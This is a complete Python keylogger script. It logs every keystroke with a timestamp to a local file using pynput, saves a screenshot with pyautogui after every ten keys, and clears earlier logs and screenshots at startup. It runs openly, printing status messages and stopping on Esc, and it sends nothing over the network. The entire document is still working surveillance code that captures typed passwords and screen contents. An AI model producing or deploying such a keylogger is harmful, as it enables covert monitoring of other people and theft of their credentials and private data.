import pyautogui
from pynput import keyboard
import logging
import os, datetime


# delete last keylogger file
def log_delete():
    log = "keylog.txt"
    if os.path.exists(log):
        os.remove(log)
        print("Previous log deleted, creating new file")
    else:
        print("Creating new log file")


# delete screenshot function
def screenshot_delete():
    screenshots_folder = "screenshots"
    screenshots = os.listdir(screenshots_folder)
    if screenshots:
        screenshot_delete = input("Would you like to delete stored screenshots? Y/N ")
        if screenshot_delete.lower() == "y":
            for file in screenshots:
                file_path = os.path.join(screenshots_folder, file)
                if os.path.isfile(file_path):
                    os.remove(file_path)
                    print(f"Deleted {file}")
            print("All screenshots have been deleted.")
        else:
            print("Screenshots will not be deleted.")
    else:
        pass


log_delete()
screenshot_delete()

key_count = 0

logging.basicConfig(filename="keylog.txt", level=logging.INFO, format="%(asctime)s - %(message)s")




# screenshot function = ss when alt is pressed
def screenshot():
    name = datetime.datetime.now().strftime("%H-%M-%S")
    pyautogui.screenshot(f'screenshots/{name}.png')


def on_press(key):
    global key_count

    if hasattr(key, 'char'):
        logging.info(f"Key: {key.char} ")
        key_count += 1
    else:
        logging.info(f"Key: {key} ")
        key_count += 1
    if key_count % 10 == 0:
        screenshot()


def on_release(key):
    if key == keyboard.Key.esc:
        return False


print("Starting listener now...")


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
